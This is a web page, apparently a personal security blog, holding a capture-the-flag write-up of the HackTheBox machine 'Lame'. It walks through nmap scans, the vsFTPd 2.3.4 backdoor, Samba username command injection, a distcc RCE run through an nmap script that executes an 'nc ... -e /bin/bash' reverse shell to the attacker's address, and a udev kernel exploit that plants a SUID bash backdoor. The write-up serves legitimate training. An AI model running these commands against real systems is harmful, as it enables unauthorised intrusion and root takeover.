@@ -1,0 +1,898 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>HackTheBox - Lame Writeup w/o Metasploit - Welcome to noobsec</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="karan bhayani" />
+    
+
+    
+        <meta property="og:title" content="HackTheBox - Lame Writeup w/o Metasploit" />
+<meta property="og:description" content="HackTheBox - Lame Writeup w/o Metasploit Introduction Lame was the first machine on the HackTheBox platform, it is very much like any other Boot2Root machine but is good for beginners. Lame is a Linux machine and has rightfully rated as Easy by the platform. There are 2 ways to own the machine and a false positive which may or may not lead to a rabbit hole, depending on the way you approach it." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/hackthebox/htb-lame/" /><meta property="article:section" content="hackthebox" />
+<meta property="article:published_time" content="2020-08-01T19:03:06+00:00" />
+<meta property="article:modified_time" content="2020-08-01T19:03:06+00:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HackTheBox - Lame Writeup w/o Metasploit"/>
+<meta name="twitter:description" content="HackTheBox - Lame Writeup w/o Metasploit Introduction Lame was the first machine on the HackTheBox platform, it is very much like any other Boot2Root machine but is good for beginners. Lame is a Linux machine and has rightfully rated as Easy by the platform. There are 2 ways to own the machine and a false positive which may or may not lead to a rabbit hole, depending on the way you approach it."/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+        
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171056200-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'light';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en-us.js" integrity=""></script>
+
+
+
+
+
+</head>
+<body>
+        <main><header>
+    <div class="brand">
+        <div id="sidebar_btn">
+            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+        </div>
+
+        <div>
+            <a href="/">noobsec</a>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">OSCP</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">OSCP AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-journey" class="pure-menu-link">OSCP Journey</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/bof" class="pure-menu-link">OSCP BOF</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">HTB</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bart" class="pure-menu-link">HTB Bart</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit" class="pure-menu-link">HTB Falafel</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-cronos" class="pure-menu-link">HTB Cronos</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bashed" class="pure-menu-link">HTB Bashed</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-lame" class="pure-menu-link">HTB Lame</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Web Attacks</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/file-inclusion" class="pure-menu-link">File Inclusion</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x01" class="pure-menu-link">SQLi 0x01</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x02" class="pure-menu-link">SQLi 0x02</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x03" class="pure-menu-link">SQLi 0x03</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Cheatsheets</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/crtp-cheatsheet" class="pure-menu-link">CRTP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/whoami/" class="pure-menu-link">About</a>
+                    
+                </li></ul>
+</nav>
+<div id="sidebar_canvas_overlay" class="hidden"></div>
+<div id="sidebar" class="close">
+    <ul><li>
+                    <details>
+                        <summary><a href="#">OSCP</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">HTB</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Web Attacks</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Cheatsheets</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <a href="/starting-point">Getting Started in Red Team</a>
+                </li><li>
+                    <a href="/whoami/">About</a>
+                </li></ul>
+</div><div id="content" class="content-margin">
+                
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#general-enumeration">General Enumeration</a></li>
+        <li><a href="#ftp-enumeration">FTP Enumeration</a></li>
+        <li><a href="#ssh-enumeration">SSH Enumeration</a></li>
+        <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+        <li><a href="#general-enumeration-contd">General Enumeration Contd.</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploit-lookup">Exploit Lookup</a>
+      <ul>
+        <li><a href="#ftp">FTP</a></li>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#smb">SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#exploiting-vsftpd-rce">Exploiting vsFTPd RCE</a></li>
+        <li><a href="#exploiting-samba-rce">Exploiting Samba RCE</a></li>
+        <li><a href="#exploiting-distcc-rce">Exploiting Distcc RCE</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#lessons-learned">Lessons Learned</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 id="hackthebox---lame-writeup-wo-metasploit">HackTheBox - Lame Writeup w/o Metasploit</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Lame was the first machine on the HackTheBox platform, it is very much like any other Boot2Root machine but is good for beginners. Lame is a Linux machine and has rightfully rated as Easy by the platform. There are 2 ways to own the machine and a false positive which may or may not lead to a rabbit hole, depending on the way you approach it.</p>
+<p>
+    <img src="/HackTheBox/htb-lame/lame.png" style="max-width: 50%;" />
+    <figcaption>Box Details</figcaption>
+</p>
+<p>This post is structured in the way I tackled this machine instead of grouping every part and dumping it. Let&rsquo;s jump in.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Before starting with any machine, I always create a directory and some sub directories as follows to help maintain structure:</p>
+<p><img src="/HackTheBox/htb-lame/mkdir.png" alt="Making Directories"></p>
+<p>I usually create an &ldquo;exploit&rdquo; sub-directory too, but I forgot this time.</p>
+<p>I will start by doing recon of the machine, and will begin with a few nmap scans as always.</p>
+<h3 id="general-enumeration">General Enumeration</h3>
+<p>Starting with an initial nmap scan, to get the top 1000 ports.</p>
+<pre  class="mc-prism hide language-text" ><code>nmap -Pn -n -oN nmap/initial 10.10.10.3
+</code></pre>
+<p><img src="/HackTheBox/htb-lame/nmap_initial.png" alt="Initial Nmap Scan"></p>
+<p>We can see that from the top 1000 ports, few are open:</p>
+<ol>
+<li>Port 21 - FTP</li>
+<li>Port 22 - SSH</li>
+<li>Port 139 - SMB</li>
+<li>Port 445 - SMB</li>
+</ol>
+<p>Let&rsquo;s make some notes!</p>
+<p>Since port 22 is open, it is most likely a Linux machine. Port 21 and 139, 445 are both some type of file sharing protocols, so maybe we might be working with some internal files or could leverage this to upload our malicious files.</p>
+<p>Let&rsquo;s get more information before we speculate any further. Running an all ports scan in the background while we poke around these few ports ourselves.</p>
+<pre  class="mc-prism hide language-text" ><code>nmap -Pn -n -p- -oN nmap/allports 10.10.10.3
+</code></pre>
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+<p>While the scan is running, let&rsquo;s take a look at the FTP banner.</p>
+<p><img src="/HackTheBox/htb-lame/ftp_enum.png" alt="FTP Banner"></p>
+<p>We use telnet to grab the banner, FTP version running is - <em>vsFTPd 2.3.4</em></p>
+<h3 id="ssh-enumeration">SSH Enumeration</h3>
+<p>Now that we have FTPs&rsquo; banner, lets get SSHs&rsquo; banner.</p>
+<p><img src="/HackTheBox/htb-lame/ssh_enum.png" alt="SSH Banner"></p>
+<p>Great, we have the SSH version with us. Good thing about getting SSH version is you get the OS running on the target machine too. We search the exact SSH version on Google and get the following result from one of the pages:</p>
+<p><img src="/HackTheBox/htb-lame/ssh_enum2.png" alt="OS Discovery"></p>
+<p>The term &ldquo;hardy-security&rdquo; catches my eye, let&rsquo;s look a little further. Let&rsquo;s search for &ldquo;Ubuntu hardy&rdquo;.</p>
+<p><img src="/HackTheBox/htb-lame/ssh_enum3.png" alt="OS Found"></p>
+<p>And we found the OS that is running - Ubuntu Hardy 8.04 LTS, a very old OS.</p>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>Now that SSHs&rsquo; enumeration is done, let&rsquo;s move on to SMBs&rsquo; enumeration.</p>
+<p><img src="/HackTheBox/htb-lame/smb_enum1.png" alt="SMB Shares Listing"></p>
+<p>Looks like we have read and write access to one of the shares - <em>/tmp</em>. Though when we try to connect, it errors out.</p>
+<p><img src="/HackTheBox/htb-lame/smb_enum2.png" alt="SMB Protocol Error"></p>
+<p>Turns out <em>smbclient</em> has made it harder to work with insecure versions of the protocol, one way to get around this without messing up the configuration file is by stating the protocols accepted in the command itself.</p>
+<p>Command sent:</p>
+<pre  class="mc-prism hide language-text" ><code>smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
+</code></pre>
+<p><img src="/HackTheBox/htb-lame/smb_enum3.png" alt="SMB Share Connected"></p>
+<p>Nothing looks interesting. Let&rsquo;s go and check if the all ports scan has finished yet or not. Also since we know that this machine is ancient, we will also run a Nmap vulnerability scan as it&rsquo;s very likely to be vulnerable by multiple issues.</p>
+<h3 id="general-enumeration-contd">General Enumeration Contd.</h3>
+<p>Let&rsquo;s check the all ports scan we had started.</p>
+<p><img src="/HackTheBox/htb-lame/nmap_allports.png" alt="Nmap All Ports Scan"></p>
+<p>The scan has been finished and turns out we have one more service running on this machine - <em>distccd</em></p>
+<p>Let&rsquo;s run a targeted scan on all the ports found using default scripts and version scanning.</p>
+<p><img src="/HackTheBox/htb-lame/nmap_tgt.png" alt="Nmap Targeted Scan"></p>
+<p>We didn&rsquo;t really find anything new, let&rsquo;s move on to the vulnerability scan.</p>
+<p>Command sent:</p>
+<pre  class="mc-prism hide language-text" ><code>nmap -Pn -n -p21,22,139,445,3632 --script vuln -sV -oN nmap/vuln_scan 10.10.10.3
+</code></pre>
+<p>Output:</p>
+<p><img src="/HackTheBox/htb-lame/nmap_vuln.png" alt="Nmap Vuln Scan"></p>
+<p>Out of all the output, this was the most interesting one. Looks like we have RCE through the distcc service.</p>
+<h2 id="exploit-lookup">Exploit Lookup</h2>
+<p>We already know that we have an RCE on hand, but nonetheless let&rsquo;s perform further enumeration on all the services, especially to find any known public exploits for each service, if available.</p>
+<h3 id="ftp">FTP</h3>
+<p>Let&rsquo;s look for any public exploits available for vsFTPd 2.3.4</p>
+<p><img src="/HackTheBox/htb-lame/ftpvuln.png" alt="Searchsploit Results"></p>
+<p>Looks like there&rsquo;s one exploit for the exact version number, and it is also a RCE which is great.</p>
+<h3 id="ssh">SSH</h3>
+<p>Upon searching for publicly known exploits for the OpenSSH service, there weren&rsquo;t any found. So we&rsquo;ll cross out SSH from out list of things to look for, unless we get some creds or keys from somewhere.</p>
+<h3 id="smb">SMB</h3>
+<p>Let&rsquo;s look for any public exploits available for SMB 3.0.20</p>
+<p><img src="/HackTheBox/htb-lame/smbvuln.png" alt="Searchsploit Results"></p>
+<p>If you look up exploits for &ldquo;smb&rdquo;, you won&rsquo;t find much, so ensure to look up the exploits for &ldquo;samba&rdquo;.
+From the list of exploits, only the second exploit fits our need. We can say this with confidence due to few reasons:</p>
+<ol>
+<li>The version fits in</li>
+<li>The exploit is a Command Execution</li>
+<li>If you look over to the exploit path, you see that this is a remote exploit. Thus we have another RCE on hand.</li>
+<li>The first exploit just looks like some bypass</li>
+<li>The last exploit is a Denial of Service, which we certainly want to avoid at all costs.</li>
+</ol>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>Let&rsquo;s test out each exploit we found sequentially, we will analyse the MSF modules and then exploit the services manually.</p>
+<h3 id="exploiting-vsftpd-rce">Exploiting vsFTPd RCE</h3>
+<p>Let&rsquo;s go through the MSF module on exploit-db.</p>
+<p><img src="/HackTheBox/htb-lame/ftpmsf1.png" alt="Evil USER Smiley"></p>
+<p>By going through the exploit, it turns out that this version of the vsFTP contained a backdoor when released to the public. It can be invoked by sending a &ldquo;:)&rdquo; in the USER parameter.</p>
+<p><img src="/HackTheBox/htb-lame/ftpmsf2.png" alt="Random PASS"></p>
+<p>Password can be anything, it is irrelevant. Knowing an actual user in the service is not required.</p>
+<p><img src="/HackTheBox/htb-lame/ftpmsf3.png" alt="Bind Shell Port"></p>
+<p>By sending those credentials, the backdoor opens a bind shell on port 6200.</p>
+<p><img src="/HackTheBox/htb-lame/ftpmsf4.png" alt="Payload"></p>
+<p>Once the backdoor is detected by checking if the port 6200 is open or not, Metasploit sends a payload to connect to it.</p>
+<p>Looks simple enough to test and exploit it manually, so let&rsquo;s do that.</p>
+<p><img src="/HackTheBox/htb-lame/ftpexploit1.png" alt="Payload Sent"></p>
+<p>Payload is sent, now let&rsquo;s try connect to the port 6200 of the target to see if it&rsquo;s open and do we get connected to it or not.</p>
+<p><img src="/HackTheBox/htb-lame/ftpexploit2.png" alt="Connection Failed"></p>
+<p>Unfortunately the port cannot be reached, and our connection times out. We will no longer focus on this service.</p>
+<h3 id="exploiting-samba-rce">Exploiting Samba RCE</h3>
+<p>A tip, when you want to view a exploit that <code>searchsploit</code> printed out in the results, you can use <code>-x</code> flag of searchsploit to view its&rsquo; contents.</p>
+<pre  class="mc-prism hide language-text" ><code>searchsploit -x unix/remote/16320.rb
+</code></pre>
+<p>Upon checking the MSF module, it is just connecting to the service normally, except the username part.</p>
+<p><img src="/HackTheBox/htb-lame/smbmsf.png" alt="Payload"></p>
+<p>All we have to do is send a reverse shell command in the username parameter and catch the shell. Let&rsquo;s test it.</p>
+<p>Sending the payload in the username field:</p>
+<p><img src="/HackTheBox/htb-lame/smbexploit1.png" alt="Payload Sent"></p>
+<p>Ensuring my listener is on to catch it:</p>
+<p><img src="/HackTheBox/htb-lame/smbexploit2.png" alt="Catching Shell"></p>
+<p>I do get a shell, but it turns out to be my own machine. Another way to login is by using <code>logon</code> command in the smb prompt.</p>
+<p><img src="/HackTheBox/htb-lame/smbexploit3.png" alt="Payload Sent"></p>
+<p>Ensuring my listener is on to catch the shell:</p>
+<p><img src="/HackTheBox/htb-lame/smbexploit4.png" alt="Catching Shell"></p>
+<p>And it looks like we are already root.</p>
+<h3 id="exploiting-distcc-rce">Exploiting Distcc RCE</h3>
+<p>Before we go any further, let&rsquo;s take a look at what distcc itself is.</p>
+<p>According to <a href="https://wiki.gentoo.org/wiki/Distcc">Gentoo wiki</a>, &ldquo;Distcc is a program designed to distribute compiling tasks across a network to participating hosts. It is comprised of a server, distccd, and a client program, distcc.&rdquo;</p>
+<p>We know that Nmap automatically tested this vulnerability out for us by sending the UID of the user the program is running under, but how do we change that? By using nmap script args.</p>
+<p>If we check which script Nmap ran, it shows that &ldquo;distcc-cve2004-2687&rdquo;, let&rsquo;s check it online to find it on one of the Nmap script pages.</p>
+<p>By searching that exact term, we find the <a href="https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html">Nmap script page</a>:</p>
+<p><img src="/HackTheBox/htb-lame/distcc0.png" alt="Nmap Script Page"></p>
+<p>Not only does it tells us the command to be used but also provides us with an example. If you take a closer look, you&rsquo;ll realise that there&rsquo;s a minor disparity in the name of the script in the example and the one that Nmap actually used. So accordingly, we&rsquo;ll have to send an argument parameter as well.</p>
+<p>Let&rsquo;s test it again, but we&rsquo;ll send some other commands to ensure that the vulnerability actually exists and that this service is exploitable.</p>
+<p><img src="/HackTheBox/htb-lame/distcc1.png" alt="Distcc Exploit Test"></p>
+<p>The hostname and the IP address of the target is exactly what was expected and so we can conclude that this service is indeed exploitable.</p>
+<p>Command sent:</p>
+<pre  class="mc-prism hide language-text" ><code>nmap -Pn -n -p3632 --script distcc-cve2004-2687 --script-args=&quot;distcc-cve2004-2687.cmd='nc 10.10.14.4 443 -e /bin/bash'&quot; 10.10.10.3
+</code></pre>
+<p>We ensure our listener is active.</p>
+<p><img src="/HackTheBox/htb-lame/distcc2.png" alt="Catching a Shell"></p>
+<p>And we got a low privileged shell on our hand. If you wanted to do this in a better way, you could send a cmd argument of <code>which nc</code> in the Nmap distcc script to check if nc is actually on the target machine or not before asking it send you a reverse shell. If it wasn&rsquo;t present and we did not test, it would have caused you some headache as to why it was not returning shell and what are you doing wrong.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Let&rsquo;s check the home directories.</p>
+<p><img src="/HackTheBox/htb-lame/preuser.png" alt="User.txt Readable"></p>
+<p>There&rsquo;s only one users home directory present, and user.txt is readable. We&rsquo;ll get it once we&rsquo;re root.</p>
+<p>Next step is to check for odd directories in the root, <code>/</code>, directory. Nothing there.
+Next is to check for odd crons, again nothing.</p>
+<p>Since this machine is old, a kernel exploit is very likely. Let&rsquo;s check the kernel version running, and details of the OS too.</p>
+<p><img src="/HackTheBox/htb-lame/priv1.png" alt="OS Enumeration"></p>
+<p>The OS info that we gathered from the SSH version was right.</p>
+<p>Let&rsquo;s look for kernel exploits using searchsploit.</p>
+<p><img src="/HackTheBox/htb-lame/priv2.png" alt="Exploit List"></p>
+<p>We won&rsquo;t take any exploit with &ldquo;x86&rdquo; or &ldquo;x86_64&rdquo; mentioned in it as from the <code>uname -a</code> command we know that the architecture the target is running is &ldquo;i686&rdquo;. That helps in reducing the list.</p>
+<p>The last three exploits ruled out.
+The fourth exploit will be at the last of our list if not completely ruled out since upon inspection the &ldquo;supported targets&rdquo; author mentioned were all 64-bit which our target is not.</p>
+<p>We have two UDEV exploits, I&rsquo;ll only try the C file, and a sock_sendpage() exploit. Let&rsquo;s test both the exploits one by one.</p>
+<p>The first exploit - sock_sendpage(), did not work as intended. Moving to the UDEV C exploit.</p>
+<p>We transfer the exploit and compile it. Since there were no instructions, the exploit will be compiled as is.</p>
+<p><img src="/HackTheBox/htb-lame/priv3.png" alt="Exploit Transferred And Compiled"></p>
+<p>The exploit has a usage section, which is great.</p>
+<p><img src="/HackTheBox/htb-lame/privusage.png" alt="Exploit Usage"></p>
+<p>We need UDEVs&rsquo; PID to execute this binary on, and it will execute any file named &ldquo;run&rdquo; in the tmp directory. Let&rsquo;s get the PID first.</p>
+<p><img src="/HackTheBox/htb-lame/priv4.png" alt="PID Found"></p>
+<p>We found the PID in both ways, which happens to be <em>2687</em>. Now let&rsquo;s put a malicious file, <em>/tmp/run</em>, before executing this exploit.</p>
+<p>I was having a hard time creating the file in the target so I created it on my attacking machine.</p>
+<p><img src="/HackTheBox/htb-lame/priv5.png" alt="Malicious File Contents"></p>
+<p>If it&rsquo;s not obvious, this file is a bash script that will copy the /bin/bash binary to /tmp/backdoor and turn its SUID and GUID bits on by changing the permissions to 6755. Since this operation will be carried out by <em>root</em> itself, a <em>chown</em> operation is not required.</p>
+<p>We&rsquo;ll transfer this malicious script to the target machine in the tmp directory and make it executable.</p>
+<p><img src="/HackTheBox/htb-lame/priv6.png" alt="Malicious File Ready"></p>
+<p>Now that the malicious file is ready, we&rsquo;ll execute the exploit binary</p>
+<p><img src="/HackTheBox/htb-lame/priv7.png" alt="Exploit Executed"></p>
+<p>Upon execution we check the contents of /tmp and we see that our &ldquo;backdoor&rdquo; is ready. To leverage this, we&rsquo;ll have to make use of a special flag in bash which ensures the EUID (Effective User ID) is maintained and those privileges aren&rsquo;t dropped upon execution.</p>
+<p><img src="/HackTheBox/htb-lame/root.png" alt="Got Root"></p>
